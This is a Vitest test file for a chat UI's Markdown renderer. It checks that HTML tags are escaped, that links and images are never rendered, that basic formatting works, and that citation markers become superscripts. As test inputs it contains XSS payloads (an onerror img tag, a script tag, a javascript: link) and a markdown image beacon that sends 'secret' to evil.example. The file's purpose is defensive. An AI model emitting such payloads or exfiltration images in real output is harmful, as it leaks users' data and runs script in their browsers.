import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "@/ui/chat/markdown";

const html = (text: string) => renderToStaticMarkup(<Markdown text={text} cite={(n) => <sup data-cite={n}>{n}</sup>} />);

describe("safe markdown renderer (model/document output is untrusted)", () => {
  it("never emits raw HTML: tags are escaped as text", () => {
    const out = html('<img src=x onerror=alert(1)> <script>alert(1)</script>');
    expect(out).not.toContain("<img");
    expect(out).not.toContain("<script");
    expect(out).toContain("&lt;img");
  });
  it("never renders links or images (no javascript: URLs, no markdown-image exfiltration beacons)", () => {
    const out = html("[click](javascript:alert(1)) ![x](https://evil.example/p.png?d=secret)");
    expect(out).not.toContain("<a ");
    expect(out).not.toContain("<img");
    expect(out).not.toContain("href=");
    expect(out).not.toContain("src=");
  });
  it("renders headings, lists, code, bold", () => {
    const out = html("## Title\n\n- one\n- two\n\n1. a\n2. b\n\n**bold** and `code`\n\n```\nlet x = 1\n```");
    expect(out).toContain("<ul");
    expect(out).toContain("<ol");
    expect(out).toContain("<strong");
    expect(out).toContain("<pre");
  });
  it("turns citation markers into the supplied component, including adjacent ones", () => {
    const out = html("Refunds take 14 days [1][3]. Also see [2].");
    expect(out.match(/data-cite="(\d)"/g)).toEqual(['data-cite="1"', 'data-cite="3"', 'data-cite="2"']);
  });
  it("does not treat non-numeric brackets as citations", () => {
    expect(html("See [note] and [x].")).not.toContain("data-cite");
  });
});
